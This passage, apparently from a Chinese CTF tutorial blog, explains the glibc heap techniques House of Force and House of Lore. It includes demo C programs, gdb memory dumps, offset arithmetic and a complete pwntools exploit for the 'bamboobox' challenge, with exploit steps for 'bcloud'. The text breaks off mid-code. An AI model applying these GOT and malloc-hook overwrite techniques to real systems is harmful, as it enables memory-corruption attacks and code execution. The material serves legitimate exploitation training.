<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    long *ptr,*ptr2;</span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(long *)(((long)ptr)+24);</span><br><span class="line">    *ptr=-1;        // &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span><br><span class="line">    malloc(-4120);  // &lt;=== 减小top chunk指针</span><br><span class="line">    malloc(0x10);   // &lt;=== 分配块实现任意地址写</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先，我们分配一个 0x10 字节大小的块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== ptr</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>之后把 top chunk 的 size 改为 0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== ptr</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0xffffffffffffffff &lt;=== top chunk size域被更改</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>注意此时的 top chunk 位置，当我们进行下一次分配的时候就会更改 top chunk 的位置到我们想要的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000602020 &lt;=== top chunk此时一切正常</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>接下来我们执行<code>malloc(-4120);</code>，-4120 是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x601020:   0x00007ffff7a91130 &lt;=== malloc@got.plt</span><br></pre></td></tr></table></figure>
<p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p>
<p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p>
<p><code>0x601010-0x602020=-4112</code></p>
<p>因此，我们当调用<code>malloc(-4120)</code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:\   0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000601010 &lt;=== 可以观察到top chunk被抬高</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>之后分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p>
<p>但是需要注意的是，在被抬高的同时，<strong>malloc@got 附近的内容也会被修改。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_head(victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br></pre></td></tr></table></figure>
<h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><p>在上一个示例中，演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面 (低地址) 的 got 表中的内容， 但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    long *ptr,*ptr2;</span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(long *)(((long)ptr)+24);</span><br><span class="line">    *ptr=-1;                 &lt;=== 修改top chunk size</span><br><span class="line">    malloc(140737345551056); &lt;=== 增大top chunk指针</span><br><span class="line">    malloc(0x10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到程序代码与简单示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure>
<p>可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk 指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算</p>
<p><code>0x7ffff7dd1b00-0x602020-0x10=140737345551056</code> 经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x00007ffff7dd1b00 &lt;=== top chunk</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = 0x00007ffff7dd1b10</span><br><span class="line"></span><br><span class="line">0x400562 &lt;main+60&gt;        mov    edi, 0x10</span><br><span class="line">0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;</span><br></pre></td></tr></table></figure>
<h2 id="2-31新限制"><a href="#2-31新限制" class="headerlink" title="2.31新限制"></a>2.31新限制</h2><p>主要是对申请大小也有限制</p>
<p><strong>2.31以前:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure>
<ol>
<li>需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于等于 -2 * MINSIZE(32位0x10,64位0x20)，这个一般情况下都是可以满足的。</li>
<li>需要使得 <code>request2size</code>正好转换为目标地址对应偏移的大小,注意负数与无符号数的对应</li>
</ol>
<p>这里需要注意的一个点是,虽然代码中request2size在REQUEST_OUT_OF_RANGE的后面,但是实际上运行中比较<code>((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</code>时,其实已经执行了request2size,也就是req已经是最终需要申请的大小</p>
<p><strong>2.31及以后:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">checked_request2size</span> <span class="params">(<span class="type">size_t</span> req, <span class="type">size_t</span> *sz)</span> __<span class="title function_">nonnull</span> <span class="params">(<span class="number">1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  *sz = request2size (req);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRDIFF_MAX INT64_MAX</span></span><br><span class="line">Expands to:</span><br><span class="line"><span class="number">0x7FFFFFFFFFFFFFFF</span><span class="comment">//有符号下最大的正整数</span></span><br></pre></td></tr></table></figure>
<p>对申请大小的检测多了一道,需要不大于有符号下最大的正整数</p>
<p>也就是说不能申请一个负数了,该攻击手法不能向低地址申请任意chunk了</p>
<h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p><strong>bamboobox</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bbb&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>程序有一个magic后门</p>
<p>程序虽然没有pie,但是堆基址依然会随机化,虽然可以泄露,并以此修改got表虽然可以做,但会更麻烦一点</p>
<p>程序在开始申请了一个chunk专门用于存放两个函数指针,分别是进入程序和退出程序时的提示信息</p>
<p>而且程序在edit时,输入大小是自己任意指定的</p>
<p>所以利用house of force</p>
<p>分配chunk到第一个chunk中并修改函数指针,并退出</p>
<p>即可触发magic</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf_path=<span class="string">&#x27;./bbb&#x27;</span></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line">p=process(elf_path)</span><br><span class="line"></span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,tbs(choice))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;item name:&#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;item:&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="built_in">str</span>(idx).encode()+<span class="string">b&#x27; : &#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;index of item:&#x27;</span>,tbs(idx))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;of item:&#x27;</span>,tbs(idx))</span><br><span class="line">	sla(<span class="string">b&#x27;item name:&#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;the item:&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">	magic=<span class="number">0x400d49</span></span><br><span class="line">	add(<span class="number">0x20</span>, <span class="string">b&quot;d&quot;</span>) </span><br><span class="line">	payload = <span class="number">0x28</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">	edit(<span class="number">0</span>, <span class="number">0x41</span>, payload)</span><br><span class="line">	offset=-<span class="number">0x30</span>-<span class="number">0x20</span>-<span class="number">0x8</span></span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	add(offset, <span class="string">b&quot;d&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	p.interactive()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	exp()</span><br></pre></td></tr></table></figure>
<h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p><strong>bcloud</strong></p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bcloud&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>程序是一个笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。</p>
<p>程序主要有以下几个功能</p>
<ol>
<li>新建 note，根据用户的输入 x 申请 x+4 的空间作为 note 的大小。</li>
<li>展示 note，啥功能也没有。。</li>
<li>编辑 note，根据用户指定的 note 编辑对应的内容。</li>
<li>删除 note，删除对应 note。</li>
<li>同步 note，标记所有的 note 已经被同步。</li>
</ol>
<p>然而在这五个功能中都没有明显可利用的漏洞,实际上漏洞在开始时。</p>
<p>在读取名字时是先读入到栈中然后再利用strcpy函数转移至堆中,都知道strcpy是遇到空字符才会停止,而栈中<strong>存储堆的指针紧邻着name缓冲区</strong>,这就意味着只要填满name缓冲区,就会将堆指针一起写到堆中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_80487A1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *tmp; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  myread((<span class="type">int</span>)s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  tmp = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dworr_804B0CC_name = (<span class="type">int</span>)tmp;</span><br><span class="line">  <span class="built_in">strcpy</span>(tmp, s);</span><br><span class="line">  info(tmp);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后info又会将其打印出来,于是泄露了堆地址</p>
<p>之后的读取org和host同样是利用strcpy,不过是这次strcpy可以转移的长度更长可以利用其覆盖topchunk的size</p>
<p>之后</p>
<ol>
<li>利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 处，当再次申请内存时，便返回 notesize 地址处的内存，从而我们就可以控制所有 note 的大小以及对应的地址了。</li>
<li>修改前三个 note 的大小为 16，并修改其指针为 free@got，atoi@got，atoi@got</li>
<li>将 free@got 修改为 puts@plt。</li>
<li>泄漏 atoi 地址。</li>
<li>再次修改另外一个 atoi got 项为 system 地址，从而拿到 shell。</li>
</ol>
<p>这题因为环境的原因只能到此为止,无法实操了</p>
<p><strong>总结主要就是对strcpy的利用,不遇到\x00就不停止</strong></p>
<h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h1><h2 id="概要-2"><a href="#概要-2" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能够控制smallbin最后一个chunk 的 bk 指针</li>
<li>能够控制指定位置 chunk 的 fd 指针</li>
</ol>
<p><strong>利用效果:</strong>分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>当malloc申请的chunk在smallbin范围内时</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">   malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>
<p>如果可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，</p>
<p>并且同时满足之后的 bck-&gt;fd == victim 的检测，那么就可以使得 small bin 的 bk 恰好为构造的 fake chunk。</p>
<p>也就是说，当下一次申请 small bin 的时候，就会分配到指定位置的 fake chunk。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 